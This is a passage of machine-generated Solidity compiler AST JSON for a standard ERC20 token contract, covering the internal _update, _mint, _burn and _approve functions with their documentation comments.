event."},"id":606,"implemented":true,"kind":"function","modifiers":[],"name":"_update","nameLocation":"6280:7:2","nodeType":"FunctionDefinition","parameters":{"id":537,"nodeType":"ParameterList","parameters":[{"constant":false,"id":532,"mutability":"mutable","name":"from","nameLocation":"6296:4:2","nodeType":"VariableDeclaration","scope":606,"src":"6288:12:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":531,"name":"address","nodeType":"ElementaryTypeName","src":"6288:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":534,"mutability":"mutable","name":"to","nameLocation":"6310:2:2","nodeType":"VariableDeclaration","scope":606,"src":"6302:10:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":533,"name":"address","nodeType":"ElementaryTypeName","src":"6302:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":536,"mutability":"mutable","name":"value","nameLocation":"6322:5:2","nodeType":"VariableDeclaration","scope":606,"src":"6314:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":535,"name":"uint256","nodeType":"ElementaryTypeName","src":"6314:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6287:41:2"},"returnParameters":{"id":538,"nodeType":"ParameterList","parameters":[],"src":"6346:0:2"},"scope":799,"src":"6271:1107:2","stateMutability":"nonpayable","virtual":true,"visibility":"internal"},{"body":{"id":638,"nodeType":"Block","src":"7777:152:2","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":619,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":614,"name":"account","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":609,"src":"7791:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":617,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7810:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":616,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7802:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":615,"name":"address","nodeType":"ElementaryTypeName","src":"7802:7:2","typeDescriptions":{}}},"id":618,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7802:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"7791:21:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":628,"nodeType":"IfStatement","src":"7787:91:2","trueBody":{"id":627,"nodeType":"Block","src":"7814:64:2","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":623,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7864:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":622,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7856:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":621,"name":"address","nodeType":"ElementaryTypeName","src":"7856:7:2","typeDescriptions":{}}},"id":624,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7856:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":620,"name":"ERC20InvalidReceiver","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":169,"src":"7835:20:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":625,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7835:32:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":626,"nodeType":"RevertStatement","src":"7828:39:2"}]}},{"expression":{"arguments":[{"arguments":[{"hexValue":"30","id":632,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"7903:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":631,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"7895:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":630,"name":"address","nodeType":"ElementaryTypeName","src":"7895:7:2","typeDescriptions":{}}},"id":633,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7895:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":634,"name":"account","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":609,"src":"7907:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":635,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":611,"src":"7916:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":629,"name":"_update","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":606,"src":"7887:7:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":636,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"7887:35:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":637,"nodeType":"ExpressionStatement","src":"7887:35:2"}]},"documentation":{"id":607,"nodeType":"StructuredDocumentation","src":"7384:332:2","text":" @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n Relies on the `_update` mechanism\n Emits a {Transfer} event with `from` set to the zero address.\n NOTE: This function is not virtual, {_update} should be overridden instead."},"id":639,"implemented":true,"kind":"function","modifiers":[],"name":"_mint","nameLocation":"7730:5:2","nodeType":"FunctionDefinition","parameters":{"id":612,"nodeType":"ParameterList","parameters":[{"constant":false,"id":609,"mutability":"mutable","name":"account","nameLocation":"7744:7:2","nodeType":"VariableDeclaration","scope":639,"src":"7736:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":608,"name":"address","nodeType":"ElementaryTypeName","src":"7736:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":611,"mutability":"mutable","name":"value","nameLocation":"7761:5:2","nodeType":"VariableDeclaration","scope":639,"src":"7753:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":610,"name":"uint256","nodeType":"ElementaryTypeName","src":"7753:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"7735:32:2"},"returnParameters":{"id":613,"nodeType":"ParameterList","parameters":[],"src":"7777:0:2"},"scope":799,"src":"7721:208:2","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":671,"nodeType":"Block","src":"8303:150:2","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":652,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":647,"name":"account","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":642,"src":"8317:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":650,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8336:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":649,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8328:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":648,"name":"address","nodeType":"ElementaryTypeName","src":"8328:7:2","typeDescriptions":{}}},"id":651,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8328:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"8317:21:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":661,"nodeType":"IfStatement","src":"8313:89:2","trueBody":{"id":660,"nodeType":"Block","src":"8340:62:2","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":656,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8388:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":655,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8380:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":654,"name":"address","nodeType":"ElementaryTypeName","src":"8380:7:2","typeDescriptions":{}}},"id":657,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8380:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":653,"name":"ERC20InvalidSender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":164,"src":"8361:18:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":658,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8361:30:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":659,"nodeType":"RevertStatement","src":"8354:37:2"}]}},{"expression":{"arguments":[{"id":663,"name":"account","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":642,"src":"8419:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"arguments":[{"hexValue":"30","id":666,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"8436:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":665,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"8428:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":664,"name":"address","nodeType":"ElementaryTypeName","src":"8428:7:2","typeDescriptions":{}}},"id":667,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8428:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":668,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":644,"src":"8440:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":662,"name":"_update","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":606,"src":"8411:7:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":669,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"8411:35:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":670,"nodeType":"ExpressionStatement","src":"8411:35:2"}]},"documentation":{"id":640,"nodeType":"StructuredDocumentation","src":"7935:307:2","text":" @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n Relies on the `_update` mechanism.\n Emits a {Transfer} event with `to` set to the zero address.\n NOTE: This function is not virtual, {_update} should be overridden instead"},"id":672,"implemented":true,"kind":"function","modifiers":[],"name":"_burn","nameLocation":"8256:5:2","nodeType":"FunctionDefinition","parameters":{"id":645,"nodeType":"ParameterList","parameters":[{"constant":false,"id":642,"mutability":"mutable","name":"account","nameLocation":"8270:7:2","nodeType":"VariableDeclaration","scope":672,"src":"8262:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":641,"name":"address","nodeType":"ElementaryTypeName","src":"8262:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":644,"mutability":"mutable","name":"value","nameLocation":"8287:5:2","nodeType":"VariableDeclaration","scope":672,"src":"8279:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":643,"name":"uint256","nodeType":"ElementaryTypeName","src":"8279:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"8261:32:2"},"returnParameters":{"id":646,"nodeType":"ParameterList","parameters":[],"src":"8303:0:2"},"scope":799,"src":"8247:206:2","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":689,"nodeType":"Block","src":"9063:54:2","statements":[{"expression":{"arguments":[{"id":683,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":675,"src":"9082:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":684,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":677,"src":"9089:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":685,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":679,"src":"9098:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},{"hexValue":"74727565","id":686,"isConstant":false,"isLValue":false,"isPure":true,"kind":"bool","lValueRequested":false,"nodeType":"Literal","src":"9105:4:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"},"value":"true"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"},{"typeIdentifier":"t_bool","typeString":"bool"}],"id":682,"name":"_approve","nodeType":"Identifier","overloadedDeclarations":[690,750],"referencedDeclaration":750,"src":"9073:8:2","typeDescriptions":{"typeIdentifier":"t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$_t_bool_$returns$__$","typeString":"function (address,address,uint256,bool)"}},"id":687,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"9073:37:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":688,"nodeType":"ExpressionStatement","src":"9073:37:2"}]},"documentation":{"id":673,"nodeType":"StructuredDocumentation","src":"8459:525:2","text":" @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n This internal function is equivalent to `approve`, and can be used to\n e.g. set automatic allowances for certain subsystems, etc.\n Emits an {Approval} event.\n Requirements:\n - `owner` cannot be the zero address.\n - `spender` cannot be the zero address.\n Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument."},"id":690,"implemented":true,"kind":"function","modifiers":[],"name":"_approve","nameLocation":"8998:8:2","nodeType":"FunctionDefinition","parameters":{"id":680,"nodeType":"ParameterList","parameters":[{"constant":false,"id":675,"mutability":"mutable","name":"owner","nameLocation":"9015:5:2","nodeType":"VariableDeclaration","scope":690,"src":"9007:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":674,"name":"address","nodeType":"ElementaryTypeName","src":"9007:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":677,"mutability":"mutable","name":"spender","nameLocation":"9030:7:2","nodeType":"VariableDeclaration","scope":690,"src":"9022:15:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":676,"name":"address","nodeType":"ElementaryTypeName","src":"9022:7:2","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":679,"mutability":"mutable","name":"value","nameLocation":"9047:5:2","nodeType":"VariableDeclaration","scope":690,"src":"9039:13:2","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":678,"name":"uint256","nodeType":"ElementaryTypeName","src":"9039:7:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"9006:47:2"},"returnParameters":{"id":681,"nodeType":"ParameterList","parameters":[],"src":"9063:0:2"},"scope":799,"src":"8989:128:2","stateMutability":"nonpayable","virtual":false,"visibility":"internal"},{"body":{"id":749,"nodeType":"Block","src":"10047:334:2","statements":[{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":707,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":702,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":693,"src":"10061:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":705,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10078:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":704,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10070:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":703,"name":"address","nodeType":"ElementaryTypeName","src":"10070:7:2","typeDescriptions":{}}},"id":706,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10070:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"10061:19:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":716,"nodeType":"IfStatement","src":"10057:89:2","trueBody":{"id":715,"nodeType":"Block","src":"10082:64:2","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":711,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10132:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":710,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10124:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":709,"name":"address","nodeType":"ElementaryTypeName","src":"10124:7:2","typeDescriptions":{}}},"id":712,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10124:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":708,"name":"ERC20InvalidApprover","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":183,"src":"10103:20:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":713,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10103:32:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":714,"nodeType":"RevertStatement","src":"10096:39:2"}]}},{"condition":{"commonType":{"typeIdentifier":"t_address","typeString":"address"},"id":722,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftExpression":{"id":717,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":695,"src":"10159:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"nodeType":"BinaryOperation","operator":"==","rightExpression":{"arguments":[{"hexValue":"30","id":720,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10178:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":719,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10170:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":718,"name":"address","nodeType":"ElementaryTypeName","src":"10170:7:2","typeDescriptions":{}}},"id":721,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10170:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"10159:21:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":731,"nodeType":"IfStatement","src":"10155:90:2","trueBody":{"id":730,"nodeType":"Block","src":"10182:63:2","statements":[{"errorCall":{"arguments":[{"arguments":[{"hexValue":"30","id":726,"isConstant":false,"isLValue":false,"isPure":true,"kind":"number","lValueRequested":false,"nodeType":"Literal","src":"10231:1:2","typeDescriptions":{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"},"value":"0"}],"expression":{"argumentTypes":[{"typeIdentifier":"t_rational_0_by_1","typeString":"int_const 0"}],"id":725,"isConstant":false,"isLValue":false,"isPure":true,"lValueRequested":false,"nodeType":"ElementaryTypeNameExpression","src":"10223:7:2","typeDescriptions":{"typeIdentifier":"t_type$_t_address_$","typeString":"type(address)"},"typeName":{"id":724,"name":"address","nodeType":"ElementaryTypeName","src":"10223:7:2","typeDescriptions":{}}},"id":727,"isConstant":false,"isLValue":false,"isPure":true,"kind":"typeConversion","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10223:10:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"}],"id":723,"name":"ERC20InvalidSpender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":188,"src":"10203:19:2","typeDescriptions":{"typeIdentifier":"t_function_error_pure$_t_address_$returns$__$","typeString":"function (address) pure"}},"id":728,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10203:31:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":729,"nodeType":"RevertStatement","src":"10196:38:2"}]}},{"expression":{"id":738,"isConstant":false,"isLValue":false,"isPure":false,"lValueRequested":false,"leftHandSide":{"baseExpression":{"baseExpression":{"id":732,"name":"_allowances","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":313,"src":"10254:11:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$","typeString":"mapping(address => mapping(address => uint256))"}},"id":735,"indexExpression":{"id":733,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":693,"src":"10266:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":false,"nodeType":"IndexAccess","src":"10254:18:2","typeDescriptions":{"typeIdentifier":"t_mapping$_t_address_$_t_uint256_$","typeString":"mapping(address => uint256)"}},"id":736,"indexExpression":{"id":734,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":695,"src":"10273:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"isConstant":false,"isLValue":true,"isPure":false,"lValueRequested":true,"nodeType":"IndexAccess","src":"10254:27:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"nodeType":"Assignment","operator":"=","rightHandSide":{"id":737,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":697,"src":"10284:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"src":"10254:35:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"id":739,"nodeType":"ExpressionStatement","src":"10254:35:2"},{"condition":{"id":740,"name":"emitEvent","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":699,"src":"10303:9:2","typeDescriptions":{"typeIdentifier":"t_bool","typeString":"bool"}},"id":748,"nodeType":"IfStatement","src":"10299:76:2","trueBody":{"id":747,"nodeType":"Block","src":"10314:61:2","statements":[{"eventCall":{"arguments":[{"id":742,"name":"owner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":693,"src":"10342:5:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":743,"name":"spender","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":695,"src":"10349:7:2","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":744,"name":"value","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":697,"src":"10358:5:2","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_uint256","typeString":"uint256"}],"id":741,"name":"Approval","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":820,"src":"10333:8:2","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$","typeString":"function (address,address,uint256)"}},"id":745,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"10333:31:2","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":746,"nodeType":"EmitStatement","src":"10328:36:2"}]}}]},"documentation":{"id":691,"nodeType":"StructuredDocumentation","src":"9123:821:2","text":" @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n `Approval` event during `transferFrom` operations.\n Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n true using the following override:\n ```\n function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     super._approve(owner, spender, value, true);\n }\n ```\n Requirements are the same as 